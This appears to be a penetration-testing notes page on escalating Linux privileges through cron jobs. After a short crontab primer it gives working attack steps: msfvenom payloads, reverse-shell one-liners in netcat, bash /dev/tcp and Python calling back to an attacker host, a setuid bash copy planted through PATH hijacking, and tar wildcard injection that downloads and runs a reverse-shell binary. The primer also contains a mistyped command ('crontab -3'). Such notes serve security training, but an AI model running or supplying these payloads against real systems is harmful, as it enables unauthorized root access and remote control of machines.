# Crontab
***

- Cron is a background service that runs continuously and checks crontab files for scheduled jobs.
- Crontabs are configuration files that specifies the schedule for running cron jobs. Each user on a Linux system can have their own crontab.
```sh
# location
ll /etc/crontab

# Edit crontabs
crontab -3
```
- Cronjobs are commands that users want to automate at specified times or intervals.

The cron daemon periodically checks the crontab file to determine if any scheduled cronjobs need to be executed.

## Cronjobs Format
A crontab is essentially a specialized file format that the 'cron' process recognizes, allowing it to execute each line sequentially. Crontabs are structured with six specific values:
```
'#' m h dom mon dow user  command
  '#'					ID
  m						Minute
  h						Hour
  dom					Day of the month
  mon					Month
  dow					Day of the week
  user				User running the command
  command		  Command should be run
```

## Exploitation
### File Permissions
If the attacker manages to overwrite one of the currently running jobs, it can result in the execution of a shell.
#### Example: in a crontabs there is
```
5  *    * * * root    /home/user4/Desktop/task.sh
```
- If you prefer not to specify a value for that particular field, simply use an asterisk (*) instead.

##### Attacker Machine
- Method 1: Msfvenom
```sh
msfvenom -p cmd/unix/reverse_netcat lhost=attackerIP lport=7777 R
  # R means raw output
```
- Set up a netcat listener
```sh
rlwrap nc -nlvp 7777
```

##### Target Machine
Method 1: Overwrite task.sh with the output of msfvenom
```sh
echo 'mkfifo /tmp/eqfjhi; nc AttackerIP 7777 0</tmp/eqfjhi | /bin/sh >/tmp/eqfjhi 2>&1; rm /tmp/eqfjhi' > task.sh
```

- Method 2: Replace task.sh with shell contents
```
#!/bin/bash
bash -i >& /dev/tcp/attackerIP/7777 0>&1
```

- Method 3: Replace task.sh with Python3 contents
```sh
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("attackerIP",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/bash","-i"\]);'
```

When task.sh is executed, it will establish a shell connection to the attacker's machine.

### PATH Environment Variable
If the PATH variable starts with /home/<username>
![alt text](https://raw.githubusercontent.com/masjadaan/Knowledgebase/main/Penetration_Testing/Exploitation/Linux/Privilege_Escalation/60f00530b0f543ef96ca4a2e6a0c0d0f.png)
- Generate a file named task.sh, and populate it with the following content:
```sh
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```
- Make task.sh executable
```sh
chmod +x task.sh
```

- After executing task.sh, you will find rootbash in the /tmp directory. Run it with the -p flag.
```sh
/tmp/rootbash -p
```

### Wildcards
If crontabs executes a script that utilizes tar with wildcards like *, we can exploit this situation.
![alt text](https://raw.githubusercontent.com/masjadaan/Knowledgebase/main/Penetration_Testing/Exploitation/Linux/Privilege_Escalation/88fea8e66c054a18a1be09b7ee57bd39.png)
#### Attacker Machine
- Msfvenom
```sh
msfvenom -p linux/x64/shell_reverse_tcp LHOST=attackerIP LPORT=7777 -f elf -o shell.elf
```
- Create http server
```sh
python3 -m http.server 9999
```
- set up a netcat listener
```sh
rlwrap nc -lnvp 7777
```

#### Target Machine
- Get shell.elf & make it executable
```sh
wget http://attackerIP:9999/shell.elf
chmod +x shell.elf
```
- Create the following
```sh
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```
Tar provides command-line options that enable the execution of additional commands as part of a checkpoint feature. When the tar command is executed within a cron job, the wildcard (*) will expand to include these files. As their filenames match valid tar command-line options, tar will interpret them as such and treat them as command-line options rather than filenames, and you get a shell on attacker machine.
